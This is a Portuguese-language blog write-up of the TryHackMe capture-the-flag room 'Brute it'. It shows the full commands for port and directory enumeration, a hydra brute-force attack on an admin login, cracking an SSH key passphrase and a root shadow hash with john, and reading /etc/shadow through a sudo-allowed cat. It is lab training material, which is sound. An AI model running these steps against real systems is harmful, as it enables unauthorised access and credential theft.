---
description: CTF do TryhackME como fiz e anotações.
title: TryhackMe - Brute it - Fácil
date: 2024-03-06 04:17:00 +/-0300
categories: [CTF, TryHackMe]
tags: [ctf, tryhackme, linux, web, facil]     # TAG names should always be lowercase
show_image_post: true
---

![Logo](/assets/img/bruteit/bruteit.jpg){: w="100" h="100" .left}

---
# **CTF - Brute it**
---
---  
## **Enumeração**

### nmap

```shell
╰─ sudo nmap -sV -Pn -sS --min-rate 10000 -stats-every 5 -p- -oN nmap $IP                        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-04 21:31 -03
Warning: 10.10.225.218 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.225.218
Host is up (0.71s latency).
Not shown: 57996 closed tcp ports (reset), 7537 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.55 seconds
```
{: .nolineno }

### ffuf

```shell
╰─ ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 100 -u http://10.10.225.218/FUZZ -e .php,.txt,.html 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.225.218/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess.txt           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4356ms]
.htpasswd.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5389ms]
.htaccess.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5389ms]
.htpasswd.txt           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5390ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5390ms]
.htpasswd.html          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 6399ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 6400ms]
.htaccess.html          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 6402ms]
admin                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 340ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 341ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 335ms]
```
{: .nolineno }

Página de login  

![alt text](/assets/img/bruteit/1.png)

Código fonte tem esse comentário  

```html
    <!-- Hey john, if you do not remember, the username is admin -->
```
{: .nolineno }
### hydra
   
brute force com hydra na página de login
   
`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.225.218 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:password invalid" -V -F`

![alt text](/assets/img/bruteit/2.png)

Ao utilizar as credenciais, tem essa página com download de chave ssh do usuário john.

![alt text](/assets/img/bruteit/3.png)

![alt text](/assets/img/bruteit/4.png)

### john

Crackeando password da chave ssh

```shell
╭─      ~/thm/bruteit     ✔  54s      
╰─ nano sshkey   
╭─      ~/thm/bruteit     ✔  3s      
╰─ ssh2john sshkey > hash              
╭─      ~/thm/bruteit     ✔    
╰─ john hash --wordlist=/usr/share/wordlists/rockyou.txt                     
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (sshkey)     
1g 0:00:00:00 DONE (2024-03-04 22:07) 11.11g/s 806755p/s 806755c/s 806755C/s rubicon..rock14
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
{: .nolineno }

## **Foothold**

Acesso via ssh

```shell
╭─      ~/thm/bruteit              INT ✘  45s      
╰─ chmod 600 sshkey               
╭─      ~/thm/bruteit              ✔    
╰─ ssh -i sshkey john@$IP
Enter passphrase for key 'sshkey': 
Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$ 
```
{: .nolineno }

### user flag

![alt text](/assets/img/bruteit/5.png)

**permissões sudo**

```shell
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```
{: .nolineno }

## **Escalação Privilégio**

Podendo executar o `cat` com `sudo`, da pra ler o arquivo shadow e tentar crackear.  

Pra crackear com john o shadow tem que criar um arquivo unshadow, mais info [aqui.](https://erev0s.com/blog/cracking-etcshadow-john/)

Como o interesse é obter root vou usar apenas a linha do root dos arquivos passwd e shadow.

`john@bruteit:~$ cat /etc/passwd`
`root:x:0:0:root:/root:/bin/bash`

Salvei a linha em um arquivo chamado `passwd.txt`

`john@bruteit:~$ sudo cat /etc/shadow`  
`root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::`

Salvei a linha no arquivo chamado `shadow.txt`

Após isso criei o arquivo unshadow

`unshadow passwd.txt shadow.txt > hashshadow`

### john
Crakeado com john

![alt text](/assets/img/bruteit/6.png)

### root flag

![alt text](/assets/img/bruteit/7.png)